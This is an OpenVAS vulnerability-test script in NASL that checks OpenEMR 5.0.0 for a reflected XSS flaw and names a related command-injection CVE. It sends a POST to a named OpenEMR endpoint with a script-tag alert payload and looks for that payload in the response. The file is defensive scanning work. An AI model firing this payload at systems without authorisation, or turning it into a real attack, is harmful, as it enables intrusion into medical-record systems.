###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_openemr_mult_vuln.nasl 8807 2018-02-14 10:17:32Z jschulte $
#
# OpenEMR 5.0.0 Multiple Vulnerabilities
#
# Authors:
# Jan Philipp Schulte <jan.schulte@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113110");
  script_version("$Revision: 8807 $");
  script_tag(name:"last_modification", value:"$Date: 2018-02-14 11:17:32 +0100 (Wed, 14 Feb 2018) $");
  script_tag(name:"creation_date", value:"2018-02-13 13:30:33 +0100 (Tue, 13 Feb 2018)");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_cve_id("CVE-2018-1000019", "CVE-2018-1000020");

  script_name("OpenEMR 5.0.0 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_openemr_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("openemr/installed");

  script_tag(name:"summary", value:"OpenEMR 5.0.0 is prone to multiple vulnerabilities.");
  script_tag(name:"vuldetect", value:"The script attempts to exploit an XSS vulnerability, and reports the vulnerability, if successful.");
  script_tag(name:"insight", value:"OpenEMR is prone to an authenticated OS Command Injection vulnerability and an unauthenticated XSS vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to fully compromise the target system.");
  script_tag(name:"affected", value:"OpenEMR 5.0.0 and prior.");
  script_tag(name:"solution", value:"No solution available as of 13th February 2018. Information will be updated once a fix becomes available.");

  script_xref(name:"URL", value:"https://www.sec-consult.com/en/blog/advisories/os-command-injection-reflected-cross-site-scripting-in-openemr/index.html");
  script_xref(name:"URL", value:"http://www.open-emr.org/wiki/index.php/OpenEMR_Patches");

  exit( 0 );
}

CPE = "cpe:/a:open-emr:openemr";

include( "host_details.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );

if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );
if( ! location = get_app_location( cpe: CPE, port: port ) ) exit( 0 );

timestamp = ereg_replace( string: gettimeofday(), pattern: ".", replace: "_" );
exploit_url = location + "/library/custom_template/ckeditor/_samples/assets/_posteddata.php";
exploit_url = ereg_replace( string: exploit_url, pattern: "//", replace: "/" );
exploit_pattern = "<script>alert('" + timestamp + "');</script>";
exploit = exploit_pattern + "=SENDF";

req = 'POST ' + exploit_url + ' HTTP/1.1\r\n';
req += 'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n';
req += 'Host: ' + http_host_name( port: port ) + '\r\n';
req += 'Accept: */*\r\n';
req += 'Content-Length: ' + strlen( exploit ) + '\r\n';
req += 'Content-Type: application/x-www-form-urlencoded\r\n\r\n';
req += exploit;

if( ! resp = http_send_recv( port: port, data: req ) ) exit( 0 );

if( exploit_pattern >< resp ){
  report = report_vuln_url(  port: port, url: exploit_url );
  security_message( data: report, port: port );
  exit( 0 );
}

exit( 99 );
